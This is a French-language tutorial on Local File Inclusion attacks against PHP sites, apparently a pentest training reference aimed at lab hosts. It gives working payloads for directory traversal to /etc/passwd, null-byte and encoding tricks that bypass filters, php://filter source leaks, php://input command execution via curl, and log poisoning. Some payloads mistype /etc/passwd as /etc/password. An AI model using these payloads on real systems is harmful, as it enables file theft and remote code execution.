

<!--- category: lfi --->
<!--- id: intro --->
<!--- title: Inclusion de Fichier Local (LFI) --->
<!--- keywords:  --->
## Inclusion de Fichier Local (LFI)




<!--- category: lfi --->
<!--- id: LFI --->
<!--- title: LFI --->
<!--- keywords:  --->
## LFI

De nombreux langages de programmations, comme le php, sont capable de lire des fichiers et les interpréter pour générer des pages HTML dynamiques.<br/>
Cette fonction peut être détournée si elle prend en entrée une variable modifiable par l'utilisateur.<br/>
<br/>
Par exemple:<br/>
L'url http://10.10.10.11/index.php?page=login.php est envoyée au serveur.<br/>
A la réception de cette requête, le serveur va inclure le fichier 'login.php', et l'éxécuter pour générer la page de login.<br/>
 <br/>
Nous allons remplacer 'login.php' par le nom d'un autre fichier, par exemple '/etc/passwd'.<br/>

```
http://10.10.10.11/index.php?page=/etc/passwd
```



<!--- category: lfi --->
<!--- id: FLI.. --->
<!--- title: LFI: Accéder à / --->
<!--- keywords:  --->
## LFI: Accéder à /

Le serveur web apache fonctionne généralement dans le répertoire /var/www/html.<br/>
Si nous précisons page=/etc/passwd, le serveur risque de chercher le fichier /var/www/html/etc/passwd. <br/>
Nous utilisons alors /../ pour remonter d'un répertoire.<br/>

```
/var/www/html/../etc/passwd => /var/www/etc/passwd.
/var/www/html/../../etc/passwd => /var/etc/passwd.
```


Nous utilisons une série de ../../../../../ devant le nom du fichier pour forcer le serveur à redescendre au niveau de la racine des répertoires.<br/>
/var/www/html/../../../../../../../ vaut /, quel que soit le nombre de ../<br/>


```
http://10.10.10.11?page=../../../../../etc/passwd
```

Une LFI permet de lire TOUS les fichiers de la machine accessible au compte du serveur web.



<!--- category: lfi --->
<!--- id: LFINull --->
<!--- title: NUll byte --->
<!--- keywords:  --->
## NUll byte

Le serveur extrait le paramètre 'page' de la requète http://10.10.10.11/index.php?page=login, et ajoute l'extension '.php' avant d'inclure le fichier.<br/>
<br/>
http://10.10.10.11/index.php?page=/etc/password va essayer d'ouvrir sans success /etc/password.php.<br/>
<br/>
Sur les version de php antérieures à 5.3.4, l'ajout d'un null byte à la fin de notre paramètre va signifier la fin de la chaine de caractère, et conduit à ignorer l'extension '.php'.<br/>
```
http://10.10.10.11/index.php?page=/etc/password%00
```





<!--- category: lfi --->
<!--- id: LFIURLDoubleEncodage --->
<!--- title: Double encodage d'URL --->
<!--- keywords:  --->
## Double encodage d'URL

```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```
    


<!--- category: lfi --->
<!--- id: LFIWaf --->
<!--- title: WAF: Filtres applicatifs --->
<!--- keywords:  --->
## WAF: Filtres applicatifs

Les développeurs ayant conscience des risques de LFI peuvent ajouter des fonctions qui vont filtrer les entrées.<br/>
Ils vont supprimer les ../ et les / dans le nom du fichier<br/>
Ce genre de filtre s'appelle un Waf : Web Application Filter.<br/>
<br/>
Il est possible de contourner ces filtres de plusieures manières:<br/>
- En prévoyant que des suites de caractères seront filtrés: ..././ une fois filtré va donner ../<br/>
http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
 <br/>
- En utilisant un encodage url:<br/>
../ devient %2e%2e%2f<br/>
/ devient %2f<br/>
http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>    
<br/>
- En utilisant un double encodage url:<br/>
../ devient %2e%2e%2f qui lui même devient %252e%252e%252f<br/>
/ devient %252f<br/>
http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
<br/>
Même si généralement les navigateurs ne ralent pas trop, ils peuvent interpréter les caractères encodés voire les réencoder. Il est souvent préférable de modifier l'URL dans une command curl ou un proxy plutôt que dans le navigateur.



<!--- category: lfi --->
<!--- id: LFIphpfilter --->
<!--- title: Php:filter : Recupérer les codes sources php --->
<!--- keywords:  --->
## Php:filter : Recupérer les codes sources php

Le langage php offre la possibilité de passer les fichiers dans des filtres avant de les ouvrir. Il est ainsi possible d'encoder un fichier en base64 avant de l'ouvrir.
````
http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php 
http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php 
````
Il ne reste plus qu'à décoder pour obtenir le code source du fichier php.



<!--- category: lfi --->
<!--- id: LFIphpinput --->
<!--- title: Php:input : Injecter du code via un Post HTTP --->
<!--- keywords:  --->
## Php:input : Injecter du code via un Post HTTP

Le langage php permet de traiter le contenu de la requête HTTP comme un fichier. Il est ainsi possible de lire et faire executer le contenu brut des données en POST avec php://input.<br/>

curl  -X POST -d 'test=&lt;? system (&quot;id&quot;); ?>' http://pwnlab/?page=php://input<br/>
<br/>
Ne fonctionne que si l'option allow_url_include = On est active dans la config php. Cette option est désactivée par défaut.



<!--- category: lfi --->
<!--- id: FLILog --->
<!--- title: Exploitation des logs --->
<!--- keywords:  --->
## Exploitation des logs

Pour injecter une payload Php dans le fichier de logs d'un serveur web, il suffit de faire une requête de type HTTP GET contenant du code php dans l'url.<br/>
Pour un serveur ftp ou ssh, injecter la payload dans le login.
Nous utilisons ensuite une LFI sur le fichier de log pour déclencher l'execution de la payload.<br/>
<br/>
Fichiers de logs usuels:<br/>
Apache<br/>
/var/log/apache/access.log<br/>
/var/log/apache/error.log<br/>
/usr/local/apache/log/error_log<br/>
/usr/local/apache2/log/error_log<br/>
/var/log/httpd/error_log<br/>
<br/>
Nginx<br/>
/var/log/nginx/access.log<br/>
/var/log/nginx/error.log<br/>
<br/>
Ssh<br/>
/var/log/sshd.log<br/>
<br/>
Il est possible de vérifier l'emplacement des fichiers de logs en lisant les fichiers de config.<br/>
Fichier de config de Nginx: /etc/nginx/nginx.conf<br/>
Entrée du fichier de config : access_log /spool/logs/nginx-access.log<br/>

